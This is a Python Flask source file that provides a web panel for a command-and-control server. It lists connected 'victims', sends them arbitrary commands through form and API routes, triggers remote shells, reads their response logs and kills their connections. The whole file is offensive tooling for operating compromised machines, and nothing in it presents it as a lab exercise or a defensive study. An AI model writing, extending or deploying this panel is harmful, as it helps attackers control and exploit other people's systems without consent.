# app.py
from flask import Flask, render_template, request, redirect, url_for, flash, Response
import threading
import os
import re
import c2_server_logic

app = Flask(__name__)
app.secret_key = os.urandom(24)

ANSI_ESCAPE = re.compile(
    r'(?:\x1B[@-_][0-?]*[ -/]*[@-~])'
    r'|(?:\x1B\].*?(?:\x07|\x1B\\))'
)

c2_started = False

@app.before_request
def start_c2_if_needed():
    global c2_started
    if not c2_started:
        print("[*] Starting C2 server in background thread...")
        threading.Thread(target=c2_server_logic.start_c2_server, daemon=True).start()
        c2_started = True

@app.route("/")
def index():
    clients = c2_server_logic.get_connected_clients()
    return render_template("index.html", clients=clients)

@app.route("/victim/<int:client_id>")
def victim_detail(client_id):
    victims = c2_server_logic.get_connected_clients()
    v = next((c for c in victims if c["client_id"] == client_id), None)
    if not v:
        return "No such victim", 404
    return render_template("victim.html", victim=v)

@app.route("/send_command", methods=["POST"])
def send_command():
    cid = int(request.form["client_id"])
    cmd = request.form["command"]
    result = c2_server_logic.send_message(cid, cmd)
    flash(result)
    return redirect(url_for("victim_detail", client_id=cid))

@app.route("/clear_responses/<int:client_id>", methods=["POST"])
def clear_responses(client_id):
    result = c2_server_logic.clear_log_file(client_id)
    flash(result)
    return redirect(url_for("victim_detail", client_id=client_id))

@app.route("/get_log/<int:client_id>")
def get_log(client_id):
    log_path = f"logs/client_{client_id}.log"
    if not os.path.isfile(log_path):
        return "", 200
    with open(log_path, "r", encoding="utf-8") as f:
        text = f.read()
    clean_text = ANSI_ESCAPE.sub('', text)
    return Response(clean_text, mimetype="text/plain")

@app.route("/obtain_shell/<int:client_id>", methods=["POST"])
def obtain_shell(client_id):
    result = c2_server_logic.send_message(client_id, "start_shell")
    flash(result)
    return redirect(url_for("victim_detail", client_id=client_id))

@app.route("/kill_connection/<int:client_id>", methods=["POST"])
def kill_connection(client_id):
    result = c2_server_logic.kill_victim(client_id)
    flash(result)
    return redirect(url_for("index"))

@app.route("/api/send_command", methods=["POST"])
def api_send_command():
    cid = int(request.form["client_id"])
    cmd = request.form["command"]
    result = c2_server_logic.send_message(cid, cmd)
    return {"result": result}

@app.route("/api/shell_ready/<int:client_id>")
def api_shell_ready(client_id):
    from c2_server_logic import shell_ready
    return {"ready": bool(shell_ready.get(client_id, False))}

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
